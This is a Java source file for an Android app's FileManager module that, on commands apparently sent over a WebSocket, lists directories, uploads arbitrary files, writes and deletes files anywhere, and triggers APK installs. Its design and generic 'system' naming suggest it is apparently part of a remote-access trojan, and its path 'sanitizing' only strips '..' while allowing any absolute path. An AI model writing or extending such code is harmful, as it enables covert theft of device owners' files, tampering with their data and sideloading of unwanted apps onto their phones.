package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.FileUploader;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class FileManager {
    private static final String TAG = Constants.TAG + ":File";
    private static FileManager instance;
    private final Context ctx;

    private FileManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized FileManager get(Context ctx) {
        if (instance == null) instance = new FileManager(ctx);
        return instance;
    }

    private String sanitizePath(String path) {
        if (path == null || path.isEmpty()) return "/";
        // Prevent path traversal
        String sanitized = path.replace("..", "").replace("\\", "/");
        if (!sanitized.startsWith("/")) sanitized = "/" + sanitized;
        return sanitized;
    }

    public void listDirectory(String path) {
        new Thread(() -> {
            try {
                String safePath = sanitizePath(path);
                File dir = new File(safePath);
                if (!dir.exists() || !dir.isDirectory()) {
                    dir = Environment.getExternalStorageDirectory();
                }
                File[] files = dir.listFiles();
                JSONArray arr = new JSONArray();
                if (files != null) {
                    for (File f : files) {
                        JSONObject obj = new JSONObject();
                        obj.put("name", f.getName());
                        obj.put("path", f.getAbsolutePath());
                        obj.put("isDir", f.isDirectory());
                        obj.put("size", f.length());
                        obj.put("modified", f.lastModified());
                        arr.put(obj);
                    }
                }
                JSONObject data = new JSONObject();
                data.put("path", dir.getAbsolutePath());
                data.put("files", arr);
                XRCWebSocketClient.get(ctx).sendEvent("file_list", data);
            } catch (JSONException e) {
                Log.e(TAG, "List dir failed", e);
            }
        }).start();
    }

    public void uploadFile(String path) {
        new FileUploader(ctx).uploadFile(sanitizePath(path));
    }

    public void writeFile(String path, String dataB64) {
        new Thread(() -> {
            try {
                String safePath = sanitizePath(path);
                File file = new File(safePath);
                File parent = file.getParentFile();
                if (parent != null && !parent.exists()) {
                    parent.mkdirs();
                }
                byte[] data = Base64.decode(dataB64, Base64.NO_WRAP);
                try (FileOutputStream fos = new FileOutputStream(file)) {
                    fos.write(data);
                }
                JSONObject result = new JSONObject();
                result.put("path", safePath);
                result.put("size", data.length);
                XRCWebSocketClient.get(ctx).sendEvent("file_written", result);
            } catch (Exception e) {
                Log.e(TAG, "Write file failed", e);
            }
        }).start();
    }

    public void deleteFile(String path) {
        new Thread(() -> {
            try {
                String safePath = sanitizePath(path);
                File file = new File(safePath);
                boolean deleted = file.delete();
                JSONObject result = new JSONObject();
                result.put("path", safePath);
                result.put("deleted", deleted);
                XRCWebSocketClient.get(ctx).sendEvent("file_deleted", result);
            } catch (JSONException e) {
                Log.e(TAG, "Delete failed", e);
            }
        }).start();
    }

    public void installApk(String path) {
        try {
            String safePath = sanitizePath(path);
            File file = new File(safePath);
            if (!file.exists()) return;
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                uri = androidx.core.content.FileProvider.getUriForFile(ctx,
                        ctx.getPackageName() + ".provider", file);
            } else {
                uri = Uri.fromFile(file);
            }
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Install APK failed", e);
        }
    }
}
